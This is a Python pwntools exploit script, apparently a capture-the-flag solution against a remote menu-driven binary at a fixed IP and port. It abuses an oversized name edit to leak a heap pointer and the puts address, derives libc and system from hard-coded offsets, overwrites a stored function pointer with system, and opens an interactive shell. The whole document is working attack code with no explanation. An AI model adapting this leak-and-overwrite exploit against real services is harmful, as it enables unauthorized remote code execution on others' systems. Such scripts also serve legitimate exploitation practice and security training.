from pwn import *
context.log_level = 'debug'
# p = process("./task_main")
#e = ELF('./task_main')
p = remote('117.78.60.139', '31278')


def getT(size, name):
    p.recvuntil("Choice >> \n")
    p.sendline('1')
    p.recvuntil("name:\n")
    p.sendline(str(size))
    p.recvuntil("name:\n")
    p.sendline(name)


def changeT(index, size, name):
    p.recvuntil("Choice >> \n")
    p.sendline('3')
    p.recvuntil("name?\n")
    p.sendline(str(index))
    p.recvuntil("name:\n")
    p.sendline(str(size))
    p.recvuntil("name:\n")
    p.send(name)
    p.recvuntil("name!")


def openT(index):
    p.recvuntil("Choice >> \n")
    p.sendline("2")
    p.recvuntil("open?\n")
    p.sendline(str(index))


getT(10, '123')
getT(10, '/bin/sh')
changeT(0, 50, 'a'*32)
openT(0)
p.recvuntil('a'*32)
binsh = puts = u64(p.recv(6)+'\x00\x00')
print hex(binsh)
changeT(0, 50, 'a'*40)
openT(0)
p.recvuntil('a'*40)
puts = u64(p.recv(6)+'\x00\x00')
libc = puts-0x6F690
print hex(libc)
system = libc+0x45390
changeT(0, 100, 'a'*32+p64(binsh)+p64(system))
openT(1)
p.interactive()
